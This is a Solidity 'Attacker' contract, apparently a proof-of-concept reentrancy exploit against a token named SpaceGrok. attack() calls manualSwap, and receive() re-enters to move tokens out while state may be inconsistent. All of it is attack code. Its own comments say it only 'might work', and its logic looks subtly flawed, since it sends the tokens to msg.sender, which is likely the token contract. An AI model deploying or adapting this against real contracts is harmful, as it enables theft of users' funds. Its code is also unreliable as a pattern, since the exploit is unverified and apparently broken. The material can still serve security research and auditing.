contract Attacker {
    ISpaceGrok public token;
    bool private attacking;

    constructor(address _token) {
        token = ISpaceGrok(_token);
    }

    receive() external payable {
        if (!attacking) {
            attacking = true;
            // Re-enter and try to transfer more tokens out
            // The contract state might be inconsistent here
            uint256 balance = token.balanceOf(address(this));
            if (balance > 0) {
                // Try to transfer out - this might work due to inconsistent state
                token.transfer(msg.sender, balance);
            }
            attacking = false;
        }
    }

    function attack() external {
        // Call manualSwap to trigger the vulnerability
        uint256 balance = token.balanceOf(address(this));
        token.manualSwap(balance);
    }
}

